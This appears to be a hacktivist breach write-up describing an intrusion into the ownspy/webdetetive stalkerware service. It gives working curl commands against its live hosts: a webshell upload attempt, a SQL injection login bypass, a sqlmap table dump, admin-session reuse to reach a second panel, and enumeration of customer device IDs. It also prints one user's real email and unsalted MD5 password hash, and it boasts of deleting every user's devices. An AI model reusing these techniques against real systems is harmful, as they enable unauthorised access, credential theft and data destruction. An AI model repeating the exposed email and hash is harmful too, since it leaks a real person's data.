                                __                
  ____ _      ______  ___  ____/ /________  __  __
 / __ \ | /| / / __ \/ _ \/ __  / ___/ __ \/ / / /
/ /_/ / |/ |/ / / / /  __/ /_/ (__  ) /_/ / /_/ / 
\____/|__/|__/_/ /_/\___/\__,_/____/ .___/\__, /  
                                  /_/    /____
               ownspy is REALLY REALLY owned!!!
               #fuckstalkerware #antisec #acab

The #fuckstalkerware games continue.
Another one bites the dust.

This time the Brazilian ownspy aka mobileinnova aka webdetetive aka saferspy.

We start off by signing up for a free trial and reverse engineering the APK
and noticed that during the registration proces our own email address and
password hash (unsalted md5) would be echoed back to us, given only the 
generated device ID.

# curl 'https://6287970dd9.era3000.com/server/?cmd=isreg&id=d41d8cd98f00b204e9800998ecf8427e'

{
  "registered": 1,
  "email": "martinsalan578@gmail.com",
  "account_type": "3",
  "tracking": 0,
  "trackingrate": 120,
  "checkrate": 120,
  "userpass": "30d8696be94bed700c6e85f219f7db5b",
  ...

Are the device IDs in any way predictable that would allow us to enumerate this
data for all of ownspy's users?

jadx tells us that depending on the Android SDK version and permissions, ownspy
will use one of these sources as the device ID (after md5summing it):

String str2 = Build.SERIAL;
String macAddress = ((WifiManager) getApplicationContext().getSystemService("wifi")).getConnectionInfo().getMacAddress();
String string = Settings.Secure.getString(getApplicationContext().getContentResolver(), "android_id");
String str3 = ((TelephonyManager) systemService).getDeviceId();

Too much entropy. None of these are very easily enumerable. Could there be a
better way? The upload photo function lets us upload any file to ownspy's 
servers, how about a webshell?

# curl 'https://6287970dd9.era3000.com/server/?cmd=newjson&id=d41d8cd98f00b204e9800998ecf8427e&v=798e70a44d93b2fe85e1aa8a3049bfb0' \
  --data '@payload.json' 

{ 
  "type": "photo", 
  "content": [{"data": "PD9waHAgcGhwaW5mbygpOwo=", "name": "photo.php", "encrypted": 0}] 
}

No luck here either. The images in the user dashboard are served through a PHP
script, not directly off the web root.

Unless we can somehow guess the path where the images are uploaded, we can't
execute our webshell.

Well, how about SQL injection?

After hitting our heads against the user dashboard and the data submission API,
and not finding anything, we decided to take a closer look at ownspy's 
infrastructure and noticed a curious subdomain: webdetetive.era3000.com
serving some sort of admin panel for webdetetive.

Invalid, expired SSL certificate. Let's try putting a single-quote in the login
field and see what happens:

# curl -k https://webdetetive.era3000.com/login.php \
  --data "email=te'st@gmail.com&password=test"

  <br />
  <b>Fatal error</b>:  Uncaught TypeError: Argument 1 passed to mysql_fetch_assoc() must be an instance of mysqli_result, boolean given, called in /home/ownspy/admin_saferespiao/login.php on line 7 and defined in /home/ownspy/mysql.php:122
  Stack trace:
  #0 /home/ownspy/admin_saferespiao/login.php(7): mysql_fetch_assoc(false)
  #1 {main}
    thrown in <b>/home/ownspy/mysql.php</b> on line <b>122</b><br />

Aha! We've got SQL injection. Let's just let ourselves into the admin panel:

# curl -kL -H 'Cookie: OWNSESS=h3car4ccebhb71glq2f7bhu91g' \
  https://webdetetive.era3000.com/login.php \
  --data-raw "email=test@gmail.com' OR id=1 -- - &password=test" 
  <br />
  <b>Fatal error</b>:  Uncaught TypeError: Argument 1 passed to mysql_fetch_assoc() must be an instance of mysqli_result, boolean given, called in /home/ownspy/admin_saferespiao/panel.php on line 15 and defined in /home/ownspy/mysql.php:122
  Stack trace:
  #0 /home/ownspy/admin_saferespiao/panel.php(15): mysql_fetch_assoc(false)
  #1 {main}
    thrown in <b>/home/ownspy/mysql.php</b> on line <b>122</b><br />

Too bad! The admin panel on the forgotten domain with the expired SSL
certificate is broken. Still, we can get some data out with sqlmap:

# sqlmap --data 'email=test@gmail.com&password=tesst' \
  -u 'https://webdetetive.era3000.com/login.php' \
  --risk 3 --dbms mysql --tables --exclude-sysdbs

Database: mobileinnova
[5 tables]
+--------------------+
| log                |
| addfunds_options   |
| affiliates         |
| log_saferespiao    |
| log_saferspy       |
+--------------------+

Database: ownspy_saferespiao
[75 tables]
+--------------------+
| Postcodes          |
| export             |
| log                |
| abperson           |
| abvalue            |
| account_notes      |
| affiliates         |
| analysis           |
| apps               |
| appsicons          |
| appsinstalled      |
| audio              |
| audiomail          |
| betachannel        |
| callhistory        |
| callrecording      |
| commands_history   |
| commands_list      |
| customblacklist    |
| customplaces       |
| devices            |
| downloads          |
| dsns               |
| facebooklite       |
| geofences          |
| geofences_events   |
| giftcodes          |
| images             |
| instagram          |
| instagram_profiles |
| invoices           |
| keylog             |
| kik                |
| languages          |
| lastlocation       |
| location           |
| mail_list          |
| mailing            |
| newdevices         |
| notif              |
| old_devices        |
| oldplaces          |
| paytweet           |
| pending_commands   |
| pending_devices    |
| places             |
| preregister        |
| preusers           |
| pricechart         |
| push_service       |
| qq_contacts        |
| qq_msgs            |
| register_code      |
| routes             |
| sentmail_list      |
| sms_commands       |
| sms_list           |
| timeline           |
| tmpcar             |
| tmptable           |
| twitter            |
| twitter_chats      |
| twitter_profiles   |
| users              |
| video              |
| webhistory         |
| whatsapp           |
| whatsapplite       |
| whatsapplite2      |
| wordlist           |
| words              |
| wordsdetected      |
| wx_contacts        |
| wx_msgs            |
| youtube            |
+--------------------+

Boolean SQL injection is so slow, though! 
We will be waiting forever to get all the device IDs this way. 
Could there be a better way?

That session cookie we got, OWNSESS=h3car4ccebhb71glq2f7bhu91g?
Could it be that with our first manual injection attempt, even though the admin
panel was broken, we've managed to create a valid admin session that we can use
elsewhere?

Trying it on paineldecontrole.webdetetive.com.br tells us that our subscription
is expired and redirects us to the main page. Looks like the session is indeed
valid, but we need to find a better place to use it.

Why was the SSL certificate for webdetetive.era3000.com invalid? It's expired.
It's valid for another domain, admin.webdetetive.com.br, which at first glance
appears to be serving an identical admin panel. But our SQL injection does not
work here. We couldn't bypass the login the same way. 

Is it actually a different version of the admin panel?

Let's set the OWNSESS cookie to the same value we used on 
webdetetive.era3000.com and go to https://admin.webdetetive.com.br/panel.php.

It works! We're in. And we can list all of ownspy's customers and get their
device IDs:

# grep -h '<td style="font-size: 12px"' ownedspy.html | head -n5
  <td style="font-size: 12px">09E19F61F4A08DFDAE6FA7D2072C02DF</td>
  <td style="font-size: 12px">3B8FF69FC51EB1D21315D532942C1B26</td>
  <td style="font-size: 12px">E5BD7C87E0A50BBCECF90D83817BD6EA</td>
  <td style="font-size: 12px">41832A25F3F1AC3F6E5C9A6E08B44733</td>
  <td style="font-size: 12px">1F89710FD9678F30225B96D371CC4AB5</td>

We can feed these back into 6287970dd9.era3000.com/server/?cmd=isreg and get
every user's email address ad unsalted md5 hash.

In case we were unsatisfied, the admin panel also lets us impersonate any user
in the user dashboard at paineldecontrole.webdetetive.com.br and spy on their
device.

We can also delete devices from every user's account so they stop submitting
new data. Which we definitely did. Because we could. Because #fuckstalkerware.

Greetz to LeopardBoy and the Decepticons.
